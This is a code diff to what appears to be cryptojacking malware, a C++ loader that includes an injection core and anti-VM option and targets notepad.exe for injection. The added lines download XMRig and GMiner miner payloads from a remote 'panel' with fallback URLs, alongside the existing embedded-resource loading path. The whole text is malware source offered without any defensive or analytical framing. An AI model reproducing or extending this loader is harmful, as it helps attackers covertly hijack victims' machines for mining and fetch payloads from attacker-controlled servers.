@@ -16,6 +16,7 @@
 #include "../include/config_manager.h"
 #include "../include/encryption.h"
 #include "../include/embedded_resource.h"
+#include "../include/remote_miner_loader.h"
 #include "../src/inject_core.cpp"
 
 #ifdef ENABLE_ANTIVM
@@ -175,6 +176,31 @@ int main(int argc, char *argv[])
     wchar_t payloadPath[MAX_PATH] = {0};
     wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";
 
+#ifdef ENABLE_REMOTE_MINERS
+    // Load XMRig miner from remote panel
+    std::cout << "[*] Remote miner loading enabled - downloading from panel..." << std::endl;
+    size_t xmrigPayloadSize = 0;
+    BYTE *xmrigBuf = nullptr;
+    
+    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", xmrigBuf, xmrigPayloadSize)) {
+        std::cerr << "[-] Failed to download XMRig from panel" << std::endl;
+        return -1;
+    }
+    
+    std::cout << "[+] Downloaded XMRig: " << xmrigPayloadSize << " bytes" << std::endl;
+
+    // Load GMiner from remote panel
+    size_t gminerPayloadSize = 0;
+    BYTE *gminerBuf = nullptr;
+    
+    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", gminerBuf, gminerPayloadSize)) {
+        std::cerr << "[-] Failed to download GMiner from panel, GPU mining may not work" << std::endl;
+        gminerBuf = nullptr;
+        gminerPayloadSize = 0;
+    } else {
+        std::cout << "[+] Downloaded GMiner: " << gminerPayloadSize << " bytes" << std::endl;
+    }
+#else
     // Load XMRig miner from embedded resource
     size_t xmrigPayloadSize = 0;
     BYTE *xmrigBuf = nullptr;
@@ -204,6 +230,7 @@ int main(int argc, char *argv[])
 
 #ifdef _DEBUG
     std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
 #endif
 
     // Build command line arguments for CPU
